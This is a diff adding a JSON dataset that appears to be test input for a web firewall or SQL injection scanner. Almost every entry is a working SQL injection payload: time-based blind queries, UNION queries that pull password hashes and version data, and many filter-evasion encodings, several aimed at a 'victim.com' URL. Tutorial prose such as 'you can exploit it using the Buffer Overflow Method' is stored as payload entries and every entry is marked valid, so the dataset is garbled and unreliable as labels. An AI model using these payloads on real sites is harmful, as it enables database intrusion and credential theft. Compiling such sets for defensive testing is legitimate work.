@@ -1,0 +1,710 @@
+[
+  {
+    "payload_type": "0",
+    "payload_text": "• SQL Injection into a String/Char parameter",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  Example: SELECT * from table where example = 'Example'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "• SQL Injection into a Numeric parameter",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  Example: SELECT * from table where id = 123",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "• A vulnerable request can get into Insert, Update, Delete, etc.",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  Example: UPDATE users SET pass = '1' where user = 't1' OR 1=1--'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " Example: select * from table where id = 1 AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(200000,md5(now())))",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "SLEEP(5)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "SELECT BENCHMARK(1000000,MD5('A'));",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "id=1 OR SLEEP(25)=0 LIMIT 1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "id=1) OR SLEEP(25)=0 LIMIT 1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "id=1' OR SLEEP(25)=0 LIMIT 1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "id=1') OR SLEEP(25)=0 LIMIT 1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "id=1)) OR SLEEP(25)=0 LIMIT 1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "id=SELECT SLEEP(25)--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  Example: (MySQL): SELECT * from table where id = 1 union select 1,2,3",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  Example: (PostgreSQL): SELECT * from table where id = 1; select 1,2,3",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1+union+select+1,2,3/*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " will be successfully performed",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1/*union*/union/*select*/select+1,2,3/*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " index.php?id=1/*uni X on*/union/*sel X ect*/select+1,2,3/*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1+union+select+1,2,3/*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1+un/**/ion+sel/**/ect+1,2,3--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " SELECT * from table where id =1 union select 1,2,3--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1;select+1,2,3+from+users+where+id=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1;select+1&id=2,3+from+users+where+id=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " SQL=\" select key from table where id= \"+Request.QueryString(\"id\")",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " id=1/**/union/*,*/select/*,*/pwd/*,*/from/*,*/users",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " Query(\"select * from table where a=\".$_GET['a'].\" and b=\".$_GET['b']);",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " Query(\"select * from table where a=\".$_GET['a'].\" and b=\".$_GET['b'].\" limit\".$_GET['c']);",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?a=1+union+select+1,2/*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?a=1+union/*&b=*/select+1,2",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " select * from table where a=1 union/* and b=*/select 1,2",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1+OR+0x50=0x50",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "/?id=(1)union(select(1),mid(hash,1,32)from(users))",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "/?id=1+union+(select'1',concat(login,hash)from+users)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "/?id=(1)union(((((((select(1),hex(hash)from(users))))))))",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "/?id=(1)or(0x50=0x50)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " /*!%55NiOn*/ /*!%53eLEct*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  %55nion(%53elect 1,2,3)-- -",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +union+distinct+select+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +union+distinctROW+select+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /**//*!12345UNION SELECT*//**/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  concat(0x223e,@@version)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  concat(0x273e27,version(),0x3c212d2d)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  concat(0x223e3c62723e,version(),0x3c696d67207372633d22)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  concat(0x223e,@@version,0x3c696d67207372633d22)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62​723e)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  concat(‘’,@@version,’’)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /**//*!50000UNION SELECT*//**/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /**/UNION/**//*!50000SELECT*//**/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /*!50000UniON SeLeCt*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  union /*!50000%53elect*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +#uNiOn+#sEleCt",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +#1q%0AuNiOn all#qa%0A#%0AsEleCt",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /*!%55NiOn*/ /*!%53eLEct*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /*!u%6eion*/ /*!se%6cect*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +un/**/ion+se/**/lect",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  uni%0bon+se%0blect",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  %2f**%2funion%2f**%2fselect",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  REVERSE(noinu)+REVERSE(tceles)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /*--*/union/*--*/select/*--*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  union (/*!/**/ SeleCT */ 1,2,3)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /*!union*/+/*!select*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  union+/*!select*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /**/union/**/select/**/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /**/uNIon/**/sEleCt/**/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /**//*!union*//**//*!select*//**/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /*!uNIOn*/ /*!SelECt*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +union+distinct+select+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +union+distinctROW+select+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +UnIOn%0d%0aSeleCt%0d%0a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  UNION/*&test=1*/SELECT/*&pwn=2*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  un?+un/**/ion+se/**/lect+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +UNunionION+SEselectLECT+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  +uni%0bon+se%0blect+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  %252f%252a*/union%252f%252a /select%252f%252a*/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /%2A%2A/union/%2A%2A/select/%2A%2A/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  %2f**%2funion%2f**%2fselect%2f**%2f",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "  /*!UnIoN*/SeLecT+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "   /*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "   union select 1,2,unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name))),4,5 /*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)?",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " Code :",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " http://victim.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "http://victim.com/news.php?id=1+uni%0bon+se%0blect+1,2,3--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "Forbidden: http://victim.com/main/news/id/1/**/",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "|",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "|/**/lpad(first_name,7,1).html",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "Bypassed : http://victim.com/main/news/id/1%0b",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "|",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "|%0blpad(first_name,7,1).html",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    http://www.site.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4….",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    You can test if the WAF can be crashed by typing:",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4….",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    If you get a 500, you can exploit it using the Buffer Overflow Method.",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "Example:",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    http://www.site.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4….",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    (which means “union select”)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "Example:",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    This firewall below replaces “*” (asterisks) with Whitespaces! What we can do is this:",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4…",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    (If the Firewall removes the “*”, the result will be: 15+union+select….)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "    So, if you find such a silly function, you can exploit it, in this way.",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "Code:",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or 1-- -' or 1 or '1\"or 1 or\"",
+    "expected_fail": false,
+    "valid": true
+  }
+]
